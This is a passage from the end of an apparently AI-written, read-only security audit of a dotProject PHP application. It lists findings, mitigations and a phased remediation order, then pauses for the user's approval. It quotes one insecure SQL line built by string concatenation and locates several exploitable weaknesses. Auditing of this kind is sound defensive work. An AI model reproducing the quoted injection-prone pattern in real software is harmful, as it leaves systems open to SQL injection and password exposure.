* **Mitigation:** Application-level field encryption for sensitive contact fields using `openssl_encrypt('aes-256-gcm', ...)` with a key in `includes/config.php`. For financial tables, enable MariaDB TDE.

### M13. SMTP TLS optional, downgrade silently accepted

* **Location:** `classes/libmail.class.php:430-434`
* **Description:** Default `mail_smtp_tls=false`. If `STARTTLS` fails, falls back to plain.
* **Mitigation:** Default to `true`; fail closed on `STARTTLS` errors; validate the server certificate (`verify_peer=true`).

### M14. Mantis XMLRPC writes plaintext password via concatenated SQL

* **Location:** `modules/mantis/core/xmlrpc/dotproject/dpserver.php:25-30`
* **Description:** `$query = "UPDATE mantis_user_table SET password='". $password->scalarval() ."' WHERE id='". $uid ."'";` — both SQLi and PII-in-cleartext.
* **Mitigation:** Replace with prepared statement; convert the Mantis password sync to a token-based flow if the integration is still in use; delete the file otherwise.

---

## LOW FINDINGS

### L1. EOL Smarty 2.6.3 (October 2004) bundled in `lib/smarty/`

* **Location:** `lib/smarty/Smarty.class.php` — `var $_version = '2.6.3';`
* **Description:** Smarty 2.x is end-of-life; the 2.6.x branch has known template-injection / sandbox-escape issues (CVE-2017-1000480, CVE-2018-13982, CVE-2018-16831). Risk is limited because no end-user input currently flows into template names, but the bundled version is fundamentally unsupported.
* **Mitigation:** Migrate to Smarty 4.x via Composer (long-term); short-term, audit every `$smarty->display()` / `$smarty->fetch()` call for user-controlled inputs.

### L2. Abandoned xajax 0.5 (2007) bundled in `lib/xajax/`

* **Location:** `lib/xajax/xajax_core/xajax.inc.php`
* **Description:** xajax has been unmaintained since ~2010, with historical XSS in response objects. dotProject's use is minimal (only `modules/igantt/IEversion/igantt.ajax*`), so removal is feasible.
* **Mitigation:** Remove xajax; rewrite the few AJAX endpoints using `fetch()` + JSON.

### L3. PHPXMLRPC 1.174 (March 2009) duplicated in 4 locations

* **Location:** `xmlrpc/PHPXMLRPC/xmlrpc.inc.php` and three copies in `modules/mantis/...` and `modules/tracIntegration/xrlib/`
* **Description:** Pre-dates XML-XXE and XMLRPC-SSRF fixes (CVE-2017-7189 class). Duplication means a single patch must be applied in 4 places.
* **Mitigation:** Drop unused subtrees. Add Composer dep `phpxmlrpc/phpxmlrpc:^4.10`. Set `libxml_disable_entity_loader(true)` at bootstrap.

### L4. JpGraph 3.0.7 (2010)

* **Location:** `lib/jpgraph/VERSION`
* **Description:** Unmaintained, historically vulnerable to image-rendering DoS.
* **Mitigation:** Migrate reports to Chart.js or bounded server-side rendering; bound chart dimensions against user input.

### L5. overLIB 4.10 (2004)

* **Location:** `lib/overlib/`
* **Description:** Abandoned popover JS library; multiple historical DOM-XSS issues.
* **Mitigation:** Replace with Tippy.js / native `<dialog>`.

### L6. phpGACL test/admin scripts shipped in webroot

* **Location:** `lib/phpgacl/admin/test.php`, `lib/phpgacl/example.php`, `lib/phpgacl/profiler.inc`
* **Mitigation:** Delete in production deployments.

### L7. Rate-limit / report / search / XMLRPC / queuescanner endpoints uncovered

* **Location:** `modules/reports/*`, `modules/smartsearch*/*`, `xmlrpc/*`, `queuescanner.php`
* **Description:** Heavy / expensive endpoints have no rate limiting. `queuescanner.php` runs the entire event queue with no auth and no token, relying on "don't expose it".
* **Mitigation:** Wrap each endpoint in `new RateLimiter(...)` after H9 is hardened. Add `Deny from all` to `queuescanner.php` and require a CLI cron token.

### L8. `do_file_aed.php` lacks a transaction; partial-write on failure

* **Location:** `modules/files/do_file_aed.php:162-203`
* **Description:** Metadata save, custom-field write, string indexing, and old-file deletion are not wrapped in a transaction. If `indexStrings()` fatals (OOM, shell exec failure), the new file row stays and the old physical file is also deleted → orphan rows + lost content.
* **Mitigation:** `$db->StartTrans(); ...; $db->CompleteTrans();` around the block. Move `deleteFile()` to *after* commit.

---

## Recommended Remediation Order

| Phase | Step | Action |
|---|---|---|
| 0 — STOP THE BLEED | 0.1 | **Resolve merge conflict in `modules/admin/do_user_aed.php` (C1).** |
| | 0.2 | **Delete `install/docs/phpinfo.php` (C8).** |
| | 0.3 | **Remove or auth-gate the 4 `unserialize($_GET)` chart files (C7).** |
| | 0.4 | **Whitelist `show_external_page` includes in the 4 `dotproject_plus` tab files (C6).** |
| | 0.5 | **Parameterize `session_id = ?` queries in `includes/session.php` (C4).** |
| 1 — Auth & crypto | 1.1 | Replace MD5 in `chpwd.php` (C2) and `admin.class.php::store()` (C3) and `authenticator.class.php` (H6). |
| | 1.2 | Widen `user_password` column to `VARCHAR(255)` (M1). |
| | 1.3 | Add `session_regenerate_id(true)` after login (H1); set `Secure`/`HttpOnly`/`SameSite` cookie flags (H2); fix logout to call `session_destroy()` (H3). |
| | 1.4 | Add timing equalization on user-not-found login branch (H8). |
| | 1.5 | Move reset token to dedicated `dotp_password_resets` table (H5). |
| 2 — CSRF & headers | 2.1 | Implement synchronizer-token pattern; validate centrally in `index.php` (C5). |
| | 2.2 | Emit CSP / X-Frame-Options / nosniff / HSTS headers (H13). |
| 3 — XSS & file handling | 3.1 | Validate `Content-Type` and `Content-Disposition` in `fileviewer.php` (C10). |
| | 3.2 | Fix the JS-context interpolation in `modules/projects/view.php` (C11). |
| | 3.3 | Add an `h()` helper and apply across module views (H12); URL-scheme whitelist (H11); escape `redirect` param (H10). |
| | 3.4 | Move uploaded files outside webroot; replace `uniqid(rand())` (C9). |
| 4 — Injection cleanup | 4.1 | Bind-parameterize `helpdesk/list.php` (H14), `forums.class.php` (H15), `admin/vw_*_usr.php`. |
| | 4.2 | Whitelist `addOrder($orderby)` callers across 6+ files (H16). |
| | 4.3 | `escapeshellarg` on file-parser invocation (H17). |
| 5 — Resilience | 5.1 | Add global exception handler (M3); disable `display_errors` in production (M2). |
| | 5.2 | Replace `die()` / `exit(db_error())` with 503 + structured logging (H18). |
| | 5.3 | Harden rate limiter (H9); extend coverage to upload / reports / search / XMLRPC / queuescanner (L7). |
| 6 — Supply chain | 6.1 | Introduce Composer; migrate Smarty (L1), xajax (L2), PHPXMLRPC (L3), JpGraph (L4), overLIB (L5). Add `composer audit` and `roave/security-advisories` to CI. |
| 7 — Privacy | 7.1 | Application-level encryption for PII columns (M12); enforce SMTP TLS (M13); rotate committed default credentials (M6); fix Mantis XMLRPC SQLi (M14). |

---

## End of Phase 1

This report is **read-only**. No code has been modified. Per the engagement rules:

> Stop and wait for my approval after generating this report. Do not write any mitigation code until I say "Proceed to Phase 2."

Awaiting approval. Please indicate which findings to remediate. I can take them individually ("fix C1"), by batch ("all Critical findings in Phase 0"), or by priority phase ("Phase 1 — Auth & crypto").
